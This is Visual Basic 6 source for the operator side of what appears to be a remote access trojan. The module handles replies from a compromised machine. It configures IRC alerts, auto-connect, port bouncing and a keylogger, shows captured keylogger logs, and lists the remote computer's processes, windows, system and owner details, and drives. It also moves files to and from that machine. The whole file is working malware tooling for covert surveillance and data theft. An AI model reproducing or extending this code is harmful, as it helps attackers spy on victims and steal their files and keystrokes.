Attribute VB_Name = "basProccess"
Function LoadSettings(Arguments As String) As String
Dim Temp() As String
Dim Item As String, Section As String, Value As String
On Error Resume Next
Temp() = Split(Arguments, ";", 3)

If UBound(Temp) < 2 Then ReportError "SaveSettings", "Insufficient parrameters, '" & Arguments & "'":    Exit Function

Item = RetrieveReservedChars(Temp(0))
Section = RetrieveReservedChars(Temp(1))
Value = RetrieveReservedChars(Temp(2))

Select Case Item
Case "irc"
    Select Case Section
    Case "enabled"
        If Value = "-1" Then
            frmMain.chkIrcNotify.Value = 1
        Else
            frmMain.chkIrcNotify.Value = 0
        End If
    Case "server"
        frmMain.txtIrcServer.Text = Value
    Case "port"
        frmMain.txtIrcPort.Text = Value
    Case "nick"
        frmMain.txtIrcNick.Text = Value
    Case "name"
        frmMain.txtIrcName.Text = Value
    Case "email"
        frmMain.txtIrcEmail.Text = Value
    End Select
Case "ac"
    Select Case Section
    Case "enabled"
        If Value = "-1" Then
            frmMain.chkAutoConnect.Value = 1
        Else
            frmMain.chkAutoConnect.Value = 0
        End If
    Case "host"
        frmMain.txtACHost.Text = Value
    Case "port"
        frmMain.txtACPort.Text = Value
    End Select
Case "listen"
    Select Case Section
    Case "enabled"
        If Value = "-1" Then
            frmMain.chkAccept.Value = 1
        Else
            frmMain.chkAccept.Value = 0
        End If
    Case "port"
        frmMain.txtAcceptPort.Text = Value
    End Select
Case "keylogger"
    Select Case Section
    Case "enabled"
        If Value = "-1" Then
            frmMain.chkKeylogger.Value = 1
        Else
            frmMain.chkKeylogger.Value = 0
        End If
    End Select
Case "bouncer"
    Select Case Section
    Case "enabled"
        If Value = "-1" Then
            frmMain.chkBouncer.Value = 1
        Else
            frmMain.chkBouncer.Value = 0
        End If
    End Select
End Select
End Function

Sub Bounce(Arguments As String)
Dim Temp() As String
Temp() = Split(Arguments, ";", 2)

Select Case Temp(0)
Case "list"
    Dim Lines() As String
    Dim Parrameters() As String
    Dim ListenOn As Single, BounceHost As String, BouncePort As Single
    
    If UBound(Temp) < 1 Then Exit Sub
    
    Lines() = Split(Temp(1), vbLf)
    
    frmMain.lstBounces.Clear
    
    For i = 0 To UBound(Lines)
        Parrameters() = Split(Lines(i), ":")
        If UBound(Parrameters) < 2 Then GoTo NextLine
        
        ListenOn = Val(Parrameters(0))
        BounceHost = Parrameters(1)
        BouncePort = Val(Parrameters(2))
        
        If ListenOn > 1 And ListenOn < 32000 Then
            If Len(BounceHost) > 1 Then
                If BouncePort > 1 And BouncePort < 32000 Then
                frmMain.lstBounces.AddItem "From port '" & ListenOn & "' To '" & BounceHost & ":" & BouncePort & "'"
                End If
            End If
        End If
NextLine:
    Next i
    
    Status "Bounce list updated."
    frmMain.lblBounceUpdate.Caption = "Updated."
    frmMain.lblBounceUpdate.ForeColor = vbGreen
    
Case "updated"
    frmMain.lblBounceUpdate.Caption = "Updated."
    frmMain.lblBounceUpdate.ForeColor = vbGreen
Case "empty"
    frmMain.lstBounces.Clear
    Status "No bounces have been specified."
    frmMain.lblBounceUpdate.Caption = "Updated."
    frmMain.lblBounceUpdate.ForeColor = vbGreen
End Select
End Sub

Sub GetLogs(logs As String)
Dim Temp() As String
Temp() = Split(logs, "*")

frmOfflineLogs.lstLogs.Clear
frmOfflineLogs.Show

For i = 0 To UBound(Temp)
    frmOfflineLogs.lstLogs.AddItem Temp(i)
Next i

End Sub

Sub FileAction(ByRef Arguments As String)
On Error Resume Next
Dim Temp() As String, Command As String, Information() As String

If InStr(1, Arguments, ";") <> 0 Then
    Command = Split(Arguments, ";")(0)
    Information() = Split(Mid(Arguments, Len(Command) + 2), "*")
Else
    Command = Arguments
End If

Select Case Command
Case "ok"
    BasMain.NextInQueue
Case "start"
    With basDeclare.FileTransfer
        frmMain.txtTransferSource.Text = .SourceFile
        frmMain.txtTransferDestination = .DestinationFile
        
        frmMain.pbTransfer.Max = FileLen(.SourceFile)
    End With
    
    basDeclare.FileTransfer.SendFile
Case "receive"
    With basDeclare.FileTransfer
        
        Close .TransferFileNumber
        
        .SourceFile = Information(0)
        .DestinationFile = Information(1)
        .TransferFileNumber = 0
        
        .Direction = "upload"
        
        .BufferLevel = 2048
        
        .TotalBytes = Information(2)
        .TotalBytesTransfered = 0
        
        .FileTransfer = True
    End With
    
    With basDeclare.FileTransfer
        frmMain.txtTransferSource.Text = .SourceFile
        frmMain.txtTransferDestination = .DestinationFile
        
        frmMain.pbTransfer.Max = .TotalBytes
    End With
BasMain.Send "faction;start"
    
    
Case "send"
    With basDeclare.FileTransfer
        
        Close .TransferFileNumber
        
        .SourceFile = Information(0)
        .DestinationFile = Information(1)
        .TransferFileNumber = 0
        
        .Direction = "upload"
        
        .BufferLevel = 2048
        
        .TotalBytes = FileLen(.SourceFile)
        .TotalBytesTransfered = 0
        
        BasMain.Send "faction;receive;" & .SourceFile & "*" & .DestinationFile & "*" & .TotalBytes
        
    End With

Case "terminate"
    With basDeclare.FileTransfer
        
        Close .TransferFileNumber
        
        .SourceFile = ""
        .DestinationFile = ""
        .Direction = ""
        .TransferFileNumber = 0
        .FileTransfer = False
    End With

Case "done"
    With basDeclare.FileTransfer
        
        Status "Received file '" & .DestinationFile & "'"
        Close .TransferFileNumber
        
        .SourceFile = ""
        .DestinationFile = ""
        .Direction = ""
        .TransferFileNumber = 0
        .FileTransfer = False

    End With
    

Case "response"
    Dim Source As String, Destination As String, FileSize As Long
        
    Source = Information(0)
    Destination = Information(1)
    FileSize = Val(Information(2))
    
    If Dir(BasMain.SimplifyDirectory(Destination), vbDirectory) = "" Then ReportError "FileAction.Request", "Path not found: '" & BasMain.SimplifyDirectory(Destination) & "'": Exit Sub
    
    BasMain.AddToTransferQueue "Download", Source, Destination, FileSize
    
    If basDeclare.FileTransfer.FileTransfer = False Then BasMain.NextInQueue

    Exit Sub
End Select
End Sub


Sub RemoteControlData(Arguments As String)

End Sub

Sub Process(Arguments As String)
Dim Temp() As String, temp2() As String

Temp() = Split(Arguments, "|")

frmTaskManager.lstID.Clear
frmTaskManager.lstTasks.Clear

For i = 0 To UBound(Temp)
    temp2() = Split(Temp(i), "*")
    If UBound(temp2) < 1 Then GoTo NextItem
    frmTaskManager.lstTasks.AddItem temp2(0) & " [" & temp2(1) & "]"
    frmTaskManager.lstID.AddItem temp2(1)
NextItem:
Next i

End Sub

Sub Window(Arguments As String)
Dim Temp() As String, temp2() As String, Command As String

Temp() = Split(Arguments, ";", 2)
If UBound(Temp) < 1 Then Exit Sub

Command = Temp(0)
Arguments = Temp(1)

Select Case LCase(Command)
Case "clear"
    frmWindowManager.lstID.Clear
    frmWindowManager.lstMain.Clear
Case "populate"
    Temp() = Split(Arguments, "")
        
    For i = 0 To UBound(Temp)
        temp2() = Split(Temp(i), ";")
        If UBound(temp2) < 1 Then GoTo NextItem
        frmWindowManager.lstMain.AddItem RetrieveReservedChars(temp2(0))
        frmWindowManager.lstID.AddItem RetrieveReservedChars(temp2(1))
NextItem:
    Next i
End Select

End Sub

Sub SystemInfo(Data As String)
Dim Temp() As String
Dim ComputerName As String, CurrentUser As String, LocalTime As String, Country As String, WindowsVersion As String, WindowsUptime As String, Owner As String, Organization As String, ProductID As String, CpuVendor As String, CpuModel As String, CpuSpeed As String, TotalMemory As String, AvailibleMemory As String, Resolution As String, InternetInfo As String

'The values will arrive in this order:
'1 WindowsVersion
'2 ProductId
'3 ComputerName
'4 WindowsUptime
'5 CurrentUser
'6 CpuVendor
'7 CpuModel
'8 CpuSpeed
'9 TotalMemory
'10 AvailibleMemory
'11 LocalTime
'12 Country
'13 Owner
'14 Organization
'15 Resolution
'16 InternetInfo

Temp() = Split(Data, vbLf)
For i = 0 To UBound(Temp)
    Select Case i
    Case 0
        WindowsVersion = Temp(i)
    Case 1
        ProductID = Temp(i)
    Case 2
        ComputerName = Temp(i)
    Case 3
        WindowsUptime = Temp(i)
    Case 4
        CurrentUser = Temp(i)
    Case 5
        CpuVendor = Temp(i)
    Case 6
        CpuModel = Temp(i)
    Case 7
        CpuSpeed = Temp(i)
    Case 8
        TotalMemory = Temp(i)
    Case 9
        AvailibleMemory = Temp(i)
    Case 10
        LocalTime = Temp(i)
    Case 11
        Country = Temp(i)
    Case 12
        Owner = Temp(i)
    Case 13
        Organization = Temp(i)
    Case 14
        Resolution = Temp(i)
    Case 15
        InternetInfo = Temp(i)
    End Select
Next i

With frmMain
    .txtComputerName.Text = ComputerName
    .txtUser.Text = CurrentUser
    .txtLocalTime.Text = LocalTime
    .txtCountry.Text = Country
    
    .txtWindowsVersion.Text = WindowsVersion
    .txtUptime.Text = WindowsUptime
    .txtOwner.Text = Owner
    .txtOrganization.Text = Organization
    .txtProductId.Text = ProductID
    
    .txtCpuVendor.Text = CpuVendor
    .txtCpuModel.Text = CpuModel
    .txtCpuSpeed.Text = CpuSpeed
    
    .txtTotalMemory.Text = TotalMemory
    .txtAvailibleMemory.Text = AvailibleMemory
    
    .txtResolution.Text = Resolution
    
    .txtInternetInfo.Text = InternetInfo
End With
End Sub

Sub Chat(Data As String)
Dim Temp() As String
Dim Nick As String, Message As String

On Error Resume Next
Temp() = Split(Data, ";")
If UBound(Temp) < 1 Then Status "RC Error: Chat Error (SS out of range)": Exit Sub
Nick = BasMain.RetrieveReservedChars(Temp(0))
Message = BasMain.RetrieveReservedChars(Temp(1))

frmMain.ReceiveMessage Nick, Message
End Sub

Sub RemoteError(Data As String)
On Error Resume Next
Dim Temp() As String
Temp() = Split(Data, ";", 2)

If frmDebug.lstRemoteErrors.ListCount > 255 Then frmDebug.lstRemoteErrors.RemoveItem (frmDebug.lstRemoteErrors.ListCount - 1)
frmDebug.lstRemoteErrors.AddItem "<" & Time & "> (" & Temp(0) & "): " & Temp(1), 0
    
Status "Remote error performing " & Temp(0)
End Sub

Sub GetFileList(Data As String)
Dim Temp() As String, Command As String, Arguments As String
Temp() = Split(Data, ";", 2)
If UBound(Temp) < 1 Then BasMain.ReportError "GetFileList", "Insufficient Parameters: '" & Data & "'": Exit Sub
Command = Temp(0)
Arguments = Temp(1)

Select Case LCase(Command)
Case "clear"
    frmMain.lstFileManager.ListItems.Clear
Case "drives"
    Dim temp2() As String
    
    Temp() = Split(Arguments, "|")
    frmMain.cmbDrives.Clear
    
For i = 0 To UBound(Temp)
        temp2() = Split(Temp(i), ";")
        If UBound(temp2) < 1 Then BasMain.ReportError "GetFileList", "Insufficient Parameters: '" & Temp(i) & "'": GoTo NextDrive
        frmMain.cmbDrives.AddItem temp2(1) & "\"
        Select Case temp2(0)
        Case "1"
            'It is a removeable drive
            frmMain.lstFileManager.ListItems.Add , , temp2(1) & "\", 3
        Case "2"
            'It is a fixed drive
            frmMain.lstFileManager.ListItems.Add , , temp2(1) & "\", 1
        Case "4"
            'It is a CD drive
            frmMain.lstFileManager.ListItems.Add , , temp2(1) & "\", 2
        Case Else
            'It is an unknown type of drive
            frmMain.lstFileManager.ListItems.Add , , temp2(1) & "\", 1
        End Select
NextDrive:
    Next i
    
    frmMain.cmbDrives.Tag = "drives"
Case "dir"
    Temp() = Split(Arguments, ";", 2)
    frmMain.cmbDrives.Tag = Temp(0)
    frmMain.txtPath.Text = Temp(0)
    Arguments = Temp(1)
    Temp() = Split(Arguments, "|")
    For i = 0 To UBound(Temp)
        Select Case Left(Temp(i), 1)
        Case "\"
            If Temp(i) = "" Or Temp(i) = "." Or Temp(i) = ".." Then GoTo NextItem
            frmMain.lstFileManager.ListItems.Add , , Mid(Temp(i), 2), 4
        Case Else
            If Temp(i) = "" Or Temp(i) = "." Or Temp(i) = ".." Then GoTo NextItem
            frmMain.lstFileManager.ListItems.Add , , Temp(i), 5
        End Select
NextItem:
    Next i
End Select
End Sub

Sub FileTransfer(Arguments As String)
Dim Temp() As String, Command As String

Temp() = Split(Arguments, ";", 2)
If UBound(Temp) < 1 Then ReportError "FileTransfer", "Insufficient Parrameters: '" & Arguments & "'": Exit Sub

Command = Temp(0)
Arguments = Temp(1)

Select Case LCase(Command)
Case "response"
    On Error GoTo RequestErrorHandler
    Dim Source As String, Destination As String, FileSize As Long
    
    Temp() = Split(Arguments, "|")
    If UBound(Temp) < 2 Then ReportError "FileTransfer.Request", "Insufficient Parrameters: '" & Arguments & "'": Exit Sub
    
    Source = Temp(0)
    Destination = Temp(1)
    FileSize = CLng(Val(Temp(2)))
    
    If Dir(BasMain.SimplifyDirectory(Destination), vbDirectory) = "" Then ReportError "FileTransfer.Request", "Path not found: '" & BasMain.SimplifyDirectory(Destination) & "'": Exit Sub
    
    BasMain.AddToTransferQueue "Download", Source, Destination, FileSize
    
    If basDeclare.FileTransfer.FileTransfer = False Then BasMain.NextInQueue

    Exit Sub

RequestErrorHandler:
    ReportError "FileTransfer.Request", Err.Description
    
End Select
End Sub
